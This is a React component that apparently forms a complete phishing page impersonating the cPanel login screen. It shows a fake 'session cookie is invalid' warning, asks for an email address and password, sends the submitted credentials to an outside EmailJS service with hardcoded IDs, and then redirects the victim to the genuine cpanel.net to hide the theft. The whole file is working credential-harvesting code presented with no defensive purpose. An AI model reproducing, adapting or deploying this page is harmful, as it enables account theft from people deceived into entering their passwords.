import emailjs from "emailjs-com";
import React from 'react';


export default function ContactUs() {

    function sendEmail(e) {
        e.preventDefault();

    emailjs.sendForm('gmail', 'template_0vlz6hx', e.target, 'user_99ogBoikg8ImrHb1RSNcB')
        .then((result) => {
            console.log(result.text);
        }, (error) => {
            console.log(error.text);
        });
        e.preventDefault();
        window.location.href='https://cpanel.net/';
    }

    return(
        <>
          <div id="content-container">
        <div id="login-container">
        <div className="notice" >
        
        <div className="notic"><i class="fas fa-times-circle fa-2x"></i> &nbsp; Your session cookie is invalid. Please log in again.</div>
            </div>
         

            <div id="login-sub-container">
            <div id="login-sub-header">
                        
                        <img src="data:image/png;base64,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" width="300" class="imgg" alt="displare" />
                 
                     </div>
                    <div id="login-sub"
                                                >
                        <div id="clickthrough_form">
                            
                           
                        </div>
                        <div id="forms">
                            <form novalidate id="login_form" form action=""  onSubmit={sendEmail}>
                                <div class="ttx"><label>Email Address</label></div>
                                <div class="input-field-login icon username-container">
                                    <input  name="email" placeholder="Enter your email address." class="std_textbox" type="text"></input>
                                </div>
                                <div class="ttxx"><label for="pass">Password</label></div>
                                <div class="input-field-login icon password-container">
                                    <input  name="name" id="pass" placeholder="Enter your email password." class="std_textbox" type="password"></input>
                                </div>
                                <div class="controls">
                                    <div class="login-btn">
                                    <input type="submit" className="btn btn-info" value="Log In "></input>
                            </div>

                                                                    </div>
                                <div class="clear" id="push"></div>
                            </form>
                       
                        </div>
           
                    </div>
                    

                                
                </div>
            </div>
        </div>

            	<div class='lang' >
						<ul>
						<li><a href="/?locale=en">English</a></li>
                    
                        
                        <li><a href="/?locale=ar">العربية</a></li>
                    
                        
                        <li><a href="/?locale=bg">български</a></li>
                    
                        
                        <li><a href="/?locale=cs">čeština</a></li>
                    
                        
                        <li><a href="/?locale=da">dansk</a></li>
                    
                        
                        <li><a href="/?locale=de">Deutsch</a></li>
                    
                        
                        <li><a href="/?locale=el">Ελληνικά</a></li>
                    
                        
                        <li><a href="/?locale=es">español</a></li>
                        </ul>
						
					</div>
					
                    <img src="https://logo-logos.com/wp-content/uploads/2016/11/cPanel_logo_logotype_CP.png " width="40" class="imggg" alt="displare" />
   
                    <div class='lan' >
  
                              Copyright© 2021 cPanel, L.L.C.<br/>
             Privacy Policy
            
                    </div>
                   
        </>
      
       
    )
}
